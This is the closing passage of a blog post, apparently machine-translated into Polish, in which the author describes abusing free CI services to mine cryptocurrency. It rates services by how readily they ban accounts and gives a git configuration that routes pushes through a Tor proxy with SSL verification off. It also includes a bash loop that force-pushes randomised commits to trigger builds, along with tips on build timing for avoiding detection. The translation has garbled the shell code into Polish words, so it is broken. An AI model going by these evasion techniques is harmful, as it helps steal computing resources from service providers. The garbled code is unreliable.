style="color: yellow; text-align: center;"> średni</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: red; text-align: center;"> zły</td></tr><tr><td style="text-align: center;"> Ciągły php</td><td style="color: red; text-align: center;"> zły</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> kumpel</td><td style="color: red; text-align: center;"> zły</td><td style="color: red; text-align: center;"> zły</td><td style="color: red; text-align: center;"> zły</td></tr><tr><td style="text-align: center;"> Warkot</td><td style="color: red; text-align: center;"> zły</td><td style="color: green; text-align: center;"> dobry</td><td style="color: red; text-align: center;"> zły</td></tr><tr><td style="text-align: center;"> Dostawca</td><td style="color: red; text-align: center;"> zły</td><td style="color: yellow; text-align: center;"> średni</td><td style="color: red; text-align: center;"> zły</td></tr><tr><td style="text-align: center;"> Nigdy kod</td><td style="color: red; text-align: center;"> zły</td><td style="color: green; text-align: center;"> dobry</td><td style="color: yellow; text-align: center;"> średni</td></tr><tr><td style="text-align: center;"> Zeist/vercel</td><td style="color: red; text-align: center;"> zły</td><td style="color: green; text-align: center;"> dobry</td><td style="color: red; text-align: center;"> zły</td></tr></tbody></table><p> W tym kontekście a<span style="color: green">  dobry</span>  konfiguracja oznacza, że ​​konfiguracja nie zajęła dużo czasu<code>ci</code>  zadanie dla procesu wydobywania (jak wszystkie usługi oparte na pulpicie nawigacyjnym zamiast pliku kropkowego repozytorium były obowiązkiem),<span style="color: red">  zły</span><code>ban-hammer</code>  oznacza, że ​​trudno było zarejestrować się w serwisie lub konta byłyby blokowane bardziej agresywnie.</p><p><a href="https://web.archive.org/web/20210222050951/https://www.bitrise.io/"> Bitrise</a>  wymaga skonfigurowania projektu, wywnioskowania środowiska, docelowej architektury, procesu wykonywania i innych rzeczy, skonfigurowanie kompilacji było bardzo czasochłonne, więc otrzymało złą ocenę w konfiguracji.<a href="https://web.archive.org/web/20210310010750/https://continuousphp.com/"> Ciągły php</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> kumpel</a> , [Codefresh] miał również wiele ręcznych, niedeklaratywnych kroków konfiguracyjnych.</p><p> Usługi takie jak [Azure-pipelines],<a href="https://web.archive.org/web/20210308202144/https://app.wercker.com/"> Wercker</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> kumpel</a>  stosuje shadow-bany na kontach, shadow-bany są złe, ponieważ pozwalają zgadywać, czy coś jest nie tak z twoją konfiguracją, czy nie. Z niektórymi usługami można się domyślać powodu blokady (prawie, że twoja kompilacja zajęła zbyt dużo czasu lub zbudowałeś zbyt wiele razy w krótkim czasie), w przypadku innych, takich jak [Azure-pipelines], zakładam, że zastosowali jakiś odcisk palca do repozytoriów użytkowników, ponieważ bany nadchodziły nawet bez nadużywania zasobów, azure i vercel również ograniczone<code>DNS</code>  dostęp w publicznych maszynach budowlanych, więc było to dodatkowe tarcie, które trzeba było przezwyciężyć za pomocą tunelu ad hoc.</p><p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome"> Warkot</a>  dał dostęp do całego 16-rdzeniowego procesora, ale ostatecznie zbanował po 2 kompilacjach<sup id="fnref:saddrone"><a class="fnref" href="#fndef:saddrone">[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship"> Kodowanie</a>  daje również dostęp do potężnych hostów kompilacji i nie banuje tak agresywnie jak dron.</p><p>Moimi ulubionymi usługami nie ze względu na opłacalność, ale ze względu na łatwość i wygodę (również przy innych projektach) były<a href="https://web.archive.org/web/20210324163536/https://travis-ci.org/"> Travis</a>, <a href="https://web.archive.org/web/20210308041527/https://semaphoreci.com/"> Semafor</a>  oraz<a href="https://web.archive.org/web/20210322105637/https://hub.docker.com/"> Centrum dokera</a> . Travis jest jak standardowy CI i jest bardzo elastyczny, Semaphore jest jedynym<code>DSL</code>  dla<code>CI</code>  wyglądało to przystępnie i dobrze, zamiast nieskończonej sekwencji spaghettowanych pól wyboru, takich jak inne interfejsy użytkownika, a Docker tylko ze względu na prostotę mapowania plików docker do kompilacji.</p><h3 id="builds_configs"><a class="header-anchor" href="#builds_configs"> Konfiguracje kompilacji</a></h3><p> Kompilacje były uruchamiane przez zadania cron oferowane przez usługi sieciowe lub przez zatwierdzenia git. Musiałeś więc śledzić zaśmiecanie tokenów dostępu lub kluczy ssh, aby zarządzać wszystkimi zatwierdzeniami git. Ważne było również, aby nie nadużywać zatwierdzeń spamowych i używać serwerów proxy podczas przesyłania do repozytoriów konfigurujących git:</p><pre><code class="toml hljs"><span class="hljs-section">[http]</span><span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span><span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span><span class="hljs-section">[https]</span><span class="hljs-attr">proxy</span> = socks5://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9050</span><span class="hljs-attr">sslverify</span> = <span class="hljs-literal">false</span><span class="hljs-section">[url "https://"]</span><span class="hljs-attr">insteadOf</span> = git://</code></pre><p> Korzystając z usług hostingowych git, github był tym bardziej dokładnym w kwestii banów, ale były one wykonywane tylko po zgłoszeniach nadużyć przez administratorów usług ci, gitlab raz przeprowadził falę banów, gdy próbowałem odnowić okres próbny CI (beztrosko). Nigdy nie otrzymałem bana na konto Bitbucket. Aby (wymusić) wypchnięcie zatwierdzeń git, mamy długą działającą pętlę, która ponownie oznacza repozytorium git:</p><pre><code class="bash hljs"><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span>
    repos_count=$(ls -ld <span class="hljs-variable">${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span><span class="hljs-variable">$repos</span>/*; <span class="hljs-keyword">do</span><span class="hljs-built_in">cd</span><span class="hljs-string">"<span class="hljs-variable"> $r</span>"</span> 
        git fetch --all
        tagger
        <span class="hljs-built_in"> Echo</span>  -mi<span class="hljs-string">"\e[32m"</span><span class="hljs-string">"sleeping for <span class="hljs-variable"> $repos_ival</span>  odkąd<span class="hljs-subst"> $(data +%H:%M:%S\ %b/%d)</span>"</span><span class="hljs-string">"\e[0m"</span> 
        spać<span class="hljs-variable"> $repos_ival</span><span class="hljs-keyword"> Gotowe</span> 
    spać 1<span class="hljs-keyword"> Gotowe</span></code></pre><p>Możliwe, że forsowanie siły w ten sposób nie jest czymś, co github bardzo lubi i mogło być przyczyną oflagowania kont. Funkcja taggera, której zadaniem jest wymuszanie wypychania różnych zatwierdzeń, korzysta ze strony internetowej (którą można dość łatwo wyszukać), która podaje kilka losowych zatwierdzeń. Nie jestem pewien, na ile to pomaga, ponieważ sama zawartość zatwierdzeń jest oczywiście podejrzana w moim przypadku. I raz też ugryzł mnie w tyłek, ponieważ commity zwracane przez to polecenie mogą zawierać przekleństwa, jeden z moich commitów został podchwycony przez bota twitterowego, który śledzi git commity przekleństwami! Dodałem czarną listę za złe słowa po incydencie.</p><p> Tak naprawdę nie zagłębiałem się w zaciemnione zatwierdzenia git i zaciemnione repozytoria git. Jedynym przypadkiem, w którym korzystałem z bardziej rozbudowanego repozytorium, był Bitrise, ponieważ nie można było skonfigurować kompilacji, jeśli system nie rozpoznawał środowiska (takiego jak aplikacje mobilne), ale nawet wtedy nie było żadnej rotacji i zawsze było tak samo repozytorium, dość łatwe do zauważenia.</p><p> Ogólnie rzecz biorąc, gdybym miał wykreślić krzywą dzwonową wokół optymalnego czasu do wydobycia<em> z pominięciem</em>zbanowanie kont we wszystkich testowanych usługach miałoby miejsce w przypadku kompilacji trwającej około 1 godziny, raz dziennie. W przypadku rdzeni procesora, z wyjątkiem kilku odstających elementów (takich jak dron), większość usług oczekuje, że wykorzystasz pełną ilość dostępnych zasobów, ponieważ kompilacje są uruchamiane na maszynach wirtualnych lub kontenerach z ograniczonymi zasobami ... a kompilacja jest zwykle zadaniem, które nasyca procesor, więc nie ma znaczenia statystycznego. Intuicyjnie jedna kompilacja dziennie jest tym, co zrobiłby przeciętny programista, więc powinieneś spodziewać się podniesionych flag, jeśli odejdziesz od średniej, a naciskanie na nadużycia nigdy nie kończy się dobrze.</p><h2 id="conclusions"><a class="header-anchor" href="#conclusions"> Wnioski</a></h2><p> Czy było warto? Części sieciowe były zdecydowanie interesujące, najgorsze było zajmowanie się rejestracją kont, w końcu nikt nie lubi klikać niekończących się e-maili potwierdzających i powtarzać paraliżujące umysł procedury interfejsu użytkownika. Pisanie oprogramowania do automatyzacji spamu też jest nudne (ponieważ głównie grzebiesz w głupich interfejsach API), a przy tym założeniu (i tym, że nigdy nie było to nic poważnego) nigdy nawet o tym nie myślałem. Czy to się opłacało? W szczytowym momencie dochodziło do czegoś takiego<code>300$</code>  miesięcznie, może wystarczy dla wenezuelczyka, a nie dla mnie :)</p><p></p><table class="fndef" id="fndef:adversary"><tbody><tr><td class="fndef-backref"><a href="#fnref:adversary">[1]</a></td><td class="fndef-content"><em> zrzędliwy sysadmin</em></td></tr></tbody></table><table class="fndef" id="fndef:infoproc"><tbody><tr><td class="fndef-backref"><a href="#fnref:infoproc">[2]</a></td><td class="fndef-content"> chociaż złamałoby to wiele założeń dotyczących prywatności, jestem pewien, że większość z nich po prostu zagląda do środka, gdy pojawia się problem, ale jest to tylko problem w przypadku środowisk uruchomieniowych opartych na kontenerach, podczas gdy maszyny wirtualne są w zasadzie czarnymi skrzynkami.</td></tr></tbody></table><table class="fndef" id="fndef:monerominer"><tbody><tr><td class="fndef-backref"><a href="#fnref:monerominer">[3]</a></td><td class="fndef-content"> Miner wbudowany w węzeł monero otrzymał trochę pracy, aby uczynić go bardziej przyjaznym dla tła, ale dystrybucja xmrig nigdy nie była skupiona na przyjazności dla tła.</td></tr></tbody></table><table class="fndef" id="fndef:difficulty"><tbody><tr><td class="fndef-backref"><a href="#fnref:difficulty">[5]</a></td><td class="fndef-content">niektóre pule oferują różne trudności na różnych portach połączeń i mają tendencję do dostosowywania trudności zadania do udziałów przesłanych przez górnika, ale szczegółowość serwera proxy była nadal wygodniejsza, ponieważ zapobiegałaby puli<a href="https://en.wikipedia.org/wiki/Vendor_lock-in"> Zamknij</a>  (chociaż nigdy tak naprawdę nie przełączaliśmy pul).</td></tr></tbody></table><table class="fndef" id="fndef:configwatch"><tbody><tr><td class="fndef-backref"><a href="#fnref:configwatch">[4]</a></td><td class="fndef-content"> nie był szczęśliwy, gdy konfiguracja nagle pojawiła się i zniknęła z systemu plików</td></tr></tbody></table><table class="fndef" id="fndef:stratumprotocol"><tbody><tr><td class="fndef-backref"><a href="#fnref:stratumprotocol">[6]</a></td><td class="fndef-content"> Nie rozmawiamy o<a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol"> protokół warstwy</a>  ponieważ mamy do czynienia z tym, co jest wdrożone w<em> Zarówno</em>  basen i górnik... co zwykle jest absolutnym minimum i prawdopodobnie z niestandardowymi rozszerzeniami.</td></tr></tbody></table><table class="fndef" id="fndef:fullbash"><tbody><tr><td class="fndef-backref"><a href="#fnref:fullbash">[7]</a></td><td class="fndef-content"> nigdy nie idź na całość :)</td></tr></tbody></table><table class="fndef" id="fndef:memoryondemand"><tbody><tr><td class="fndef-backref"><a href="#fnref:memoryondemand">[8]</a></td><td class="fndef-content"> Nie badałem, co się dzieje, gdy proces ładuje dodatkowe funkcje w czasie wykonywania, ponieważ jądro szukałoby adresu w układzie pamięci pliku wykonywalnego, który miałby dostęp do systemu plików i prawdopodobnie spowodowałby awarię.</td></tr></tbody></table><table class="fndef" id="fndef:freehostinglimits"><tbody><tr><td class="fndef-backref"><a href="#fnref:freehostinglimits">[9]</a></td><td class="fndef-content"> Limity są dowolne, czas procesora jest krótszy niż sekunda, pamięć jest mniejsza niż 128M, połączenia wychodzące są blokowane.</td></tr></tbody></table><table class="fndef" id="fndef:cpanelssh"><tbody><tr><td class="fndef-backref"><a href="#fnref:cpanelssh">[10]</a></td><td class="fndef-content"> przy odrobinie cierpliwości możesz również uruchomić pełną instancję ssh w środowisku rozruchowym wokół przestrzeni twojego konta cpanel,<em> z pominięciem</em>  posiadanie dostępu do wbudowanego SSH cpanel, który jest zwykle wyłączany przez dostawców hostingu.</td></tr></tbody></table><table class="fndef" id="fndef:openshift"><tbody><tr><td class="fndef-backref"><a href="#fnref:openshift">[11]</a></td><td class="fndef-content"> openshift przeszedł z rocznego darmowego poziomu na 3 miesiące do 1 miesiąca, zaczynając wymagać uwierzytelniania przez telefon, mogę zagwarantować, że nie byłem jedynym, który nadużywał ich usług.</td></tr></tbody></table><table class="fndef" id="fndef:herokucontainers"><tbody><tr><td class="fndef-backref"><a href="#fnref:herokucontainers">[12]</a></td><td class="fndef-content"> Kontenery darmowego poziomu Heroku są dość obfite w zasoby, zapewniają procesor 4c/8t (wirtualny), mnóstwo pamięci RAM i dużą pamięć masową (która jednak nie jest trwała i odrzucana po wyłączeniu hamowni).</td></tr></tbody></table><table class="fndef" id="fndef:saddrone"><tbody><tr><td class="fndef-backref"><a href="#fnref:saddrone">[13]</a></td><td class="fndef-content">Dodali muc bardziej rygorystyczne zasady rejestracji, po kilku banach mogłem się do tego przyczynić.</td></tr></tbody></table><p></p><div id="post-tags-list"> 
Tagi postów:
<span class="post-tag"><a href="/pl/posts/tag/crypto" style="">  krypto</a>, </span><span class="post-tag"><a href="/pl/posts/tag/net" style="">  Internet</a>, </span><span class="post-tag"><a href="/pl/posts/tag/shell" style="">  powłoka</a></span></div><div class="page-foot"><div class="copyright"> 
        21 sierpnia 2021
    </div><script async="" crossorigin="anonymous" issue-term="pathname" label="Comment" repo="untoreh/untoreh.github.io" src="https://utteranc.es/client.js"></script></div></div><div class="page__footer"><footer><div class="page__footer-copyright"> 
            © untreh - Powered by<a href="https://github.com/tlienart/Franklin.jl"> Franklin</a></div><div class="page__footer-links">
            -
            <ul><li><a href="/pl/sitemap.xml"> Mapa strony</a></li>
                |
                <li><a href="/pl/tag"> Tagi</a></li>
                |
                <li><a href="/pl/feed.xml"> RSS</a></li></ul></div><ul class="author__wrap"><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-twitter-square"></i></a></li><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-github"></i></a></li><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a></li><li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></li></ul></footer></div><script crossorigin="anonymous" defer="" id="fa" integrity="sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH" src="https://use.fontawesome.com/releases/v5.8.2/js/all.js"></script><script src="/libs/colors.js"></script><script src="/libs/menu.js"></script><script defer="" src="/libs/lunr/lunr.min.js"></script></body></HTML>